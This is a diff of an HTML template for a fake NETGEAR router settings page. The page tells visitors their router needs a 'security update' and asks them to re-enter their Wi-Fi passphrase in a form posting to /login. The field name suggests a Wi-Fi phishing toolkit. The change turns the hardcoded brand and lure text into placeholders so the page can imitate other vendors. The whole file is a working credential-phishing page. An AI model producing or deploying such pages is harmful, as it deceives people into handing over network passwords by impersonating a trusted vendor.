@@ -1,39 +1,41 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
-    <title>NETGEAR — Wireless Settings</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>{{page_title}}</title>
     <style>
-        *{margin:0;padding:0;box-sizing:border-box;}body{font-family:'Segoe UI',sans-serif;background:#e8e8e8;}
-        .header{background:#5b2d8e;padding:14px 24px;display:flex;align-items:center;justify-content:space-between;}
-        .header h1{color:#fff;font-size:20px;font-weight:400;letter-spacing:1px;}
-        .header .model{color:#c4a6e0;font-size:12px;}
-        .main{max-width:680px;margin:20px auto;background:#fff;border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,.1);overflow:hidden;}
-        .tab{background:#6b3fa0;color:#fff;padding:10px 20px;font-size:14px;font-weight:600;}
-        .body{padding:24px;}
-        .warn{background:#ffe8e8;border-left:4px solid #d9534f;padding:12px;margin-bottom:20px;font-size:13px;color:#a94442;}
-        .field{margin-bottom:16px;}
-        .field label{display:block;font-size:12px;color:#555;font-weight:600;margin-bottom:4px;}
-        .field input{width:100%;padding:10px;border:1px solid #ccc;border-radius:4px;font-size:14px;}
-        .btn{padding:10px 28px;background:#5b2d8e;color:#fff;border:none;border-radius:4px;font-size:14px;cursor:pointer;}
-        .btn:hover{background:#7b4dae;}
-        .footer{text-align:center;padding:14px;font-size:10px;color:#999;border-top:1px solid #eee;}
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Segoe UI', sans-serif; background: #e8e8e8; }
+        .header { background: #5b2d8e; padding: 14px 24px; display: flex; align-items: center; justify-content: space-between; }
+        .header h1 { color: #fff; font-size: 20px; font-weight: 400; letter-spacing: 1px; }
+        .header .model { color: #c4a6e0; font-size: 12px; }
+        .main { max-width: 680px; margin: 20px auto; background: #fff; border-radius: 6px; box-shadow: 0 2px 8px rgba(0,0,0,.1); overflow: hidden; }
+        .tab { background: #6b3fa0; color: #fff; padding: 10px 20px; font-size: 14px; font-weight: 600; }
+        .body { padding: 24px; }
+        .warn { background: #ffe8e8; border-left: 4px solid #d9534f; padding: 12px; margin-bottom: 20px; font-size: 13px; color: #a94442; }
+        .field { margin-bottom: 16px; }
+        .field label { display: block; font-size: 12px; color: #555; font-weight: 600; margin-bottom: 4px; }
+        .field input { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 4px; font-size: 14px; }
+        .btn { padding: 10px 28px; background: #5b2d8e; color: #fff; border: none; border-radius: 4px; font-size: 14px; cursor: pointer; }
+        .btn:hover { background: #7b4dae; }
+        .footer { text-align: center; padding: 14px; font-size: 10px; color: #999; border-top: 1px solid #eee; }
     </style>
 </head>
 <body>
-    <div class="header"><h1>NETGEAR</h1><span class="model">Router Admin</span></div>
+    <div class="header"><h1>{{brand}}</h1><span class="model">{{model_subtitle}}</span></div>
     <div class="main">
-        <div class="tab">Wireless Settings &mdash; Security</div>
+        <div class="tab">{{section_tab}}</div>
         <div class="body">
-            <div class="warn">Your router requires a security update. Please re-enter your wireless password to continue.</div>
+            <div class="warn">{{alert_message}}</div>
             <form method="POST" action="/login">
-                <div class="field"><label>Network Name (SSID)</label><input type="text" value="NETGEAR-5G" disabled></div>
-                <div class="field"><label>Security Mode</label><input type="text" value="WPA2-PSK [AES]" disabled></div>
-                <div class="field"><label>Passphrase (Network Key)</label><input type="password" name="wfphshr-wpa-password" placeholder="Enter your Wi-Fi password" required></div>
-                <button type="submit" class="btn">Apply</button>
+                <div class="field"><label>{{ssid_label}}</label><input type="text" value="{{ssid_value}}" disabled></div>
+                <div class="field"><label>{{security_mode_label}}</label><input type="text" value="{{security_mode_value}}" disabled></div>
+                <div class="field"><label>{{passphrase_label}}</label><input type="password" name="wfphshr-wpa-password" placeholder="{{password_placeholder}}" required></div>
+                <button type="submit" class="btn">{{submit_button}}</button>
             </form>
         </div>
-        <div class="footer">NETGEAR, Inc. All rights reserved.</div>
+        <div class="footer">{{footer}}</div>
     </div>
 </body>
 </html>
